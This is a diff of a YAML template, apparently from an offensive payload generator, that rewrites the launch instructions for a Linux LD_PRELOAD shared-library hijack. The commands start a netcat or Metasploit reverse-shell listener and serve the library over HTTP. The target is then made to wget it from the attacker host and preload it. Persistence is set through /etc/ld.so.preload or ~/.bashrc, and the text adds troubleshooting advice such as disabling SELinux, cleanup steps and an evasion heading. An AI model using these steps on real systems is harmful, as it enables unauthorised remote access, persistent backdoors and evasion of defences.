@@ -81,73 +81,45 @@ output:
   launch_instructions: |
     C Linux LD_PRELOAD Shared Library Hijacking - Launch Instructions
 
-    Step 1: Start Listener
-
-    On attacker machine:
+    Start Listener:
     nc -lvnp {{ lport }}
 
-    Or using Metasploit:
-    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; exploit"
+    Or with Metasploit:
+    msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Step 2: Transfer Library to Target
-
-    Transfer the generated shared library to the target Linux system:
-
-    Using Python HTTP server:
+    Transfer and Execute:
     python3 -m http.server 8080
+    On target: wget http://{{ lhost }}:8080/{{ output_file }} -O /tmp/{{ output_file }} && chmod +x /tmp/{{ output_file }} && LD_PRELOAD=/tmp/{{ output_file }} id
 
-    On target:
-    wget http://{{ lhost }}:8080/{{ output_file }} -O /tmp/{{ output_file }}
-    chmod +x /tmp/{{ output_file }}
-
-    Step 3: Test LD_PRELOAD Hijacking
-
-    Test with a simple command:
-    LD_PRELOAD=/tmp/{{ output_file }} id
-
-    This should:
-    1. Print "[Hijacked] Returning from function..."
-    2. Spawn reverse shell to your listener
-    3. Execute the 'id' command normally
-
-    Step 4: Establish Persistence
-
-    Option A - System-wide persistence (requires root):
+    Establish Persistence (System-Wide - Root Required):
     echo "/tmp/{{ output_file }}" > /etc/ld.so.preload
 
-    Option B - User-level persistence:
-    echo 'export LD_PRELOAD=/tmp/{{ output_file }}' >> ~/.bashrc
-    source ~/.bashrc
-
-    Option C - Target specific program:
-    Create wrapper script:
-    #!/bin/bash
-    LD_PRELOAD=/tmp/{{ output_file }} /usr/bin/program
-
-    Step 5: Verify Persistence
-
-    Log out and back in, or run any command that calls geteuid():
-    id
-    whoami
-    ls -la
-
-    Each execution will spawn a new reverse shell.
+    Establish Persistence (User-Level):
+    echo 'export LD_PRELOAD=/tmp/{{ output_file }}' >> ~/.bashrc && source ~/.bashrc
 
     Notes:
-
-    - Hijacks geteuid() function (called by many programs)
+    - Hijacks geteuid() function (called by many programs: id, whoami, ls, etc.)
     - Forks child process to execute shellcode without disrupting parent
+    - Reverse shell connects to {{ lhost }}:{{ lport }}
     - Works on x64 Linux systems
-    - Requires write access to target directory
-    - /etc/ld.so.preload requires root access
+    - Each program execution spawns new reverse shell (very noisy!)
+    - /etc/ld.so.preload requires root access for system-wide persistence
+    - ~/.bashrc persistence works for current user only
+    - Other hijack targets: getuid(), access(), open(), connect()
 
-    Common Hijack Targets:
+    Troubleshooting:
+    - No execution: Check if LD_PRELOAD is honored (`getconf GNU_LIBC_VERSION` to verify glibc)
+    - Symbol errors: Original geteuid() not being called; check logs with `dmesg | tail`
+    - No persistence: Verify /etc/ld.so.preload exists and is readable by all users
+    - SUID binaries ignore: LD_PRELOAD is ignored for SUID/SGID binaries (security feature)
+    - SELinux blocks: Check SELinux status with `getenforce`; may need to disable or create policy
+    - Multiple shells: Each command spawns shell; consider adding mutex/lock file to limit
 
-    - geteuid() - Get effective user ID (very common)
-    - getuid() - Get user ID
-    - access() - Check file accessibility
-    - open() - Open files
-    - connect() - Network connections
+    Cleanup:
+    On target:
+    rm -f /tmp/{{ output_file }}
+    rm -f /etc/ld.so.preload
+    sed -i '/LD_PRELOAD/d' ~/.bashrc
 
     Evasion Tips:
 
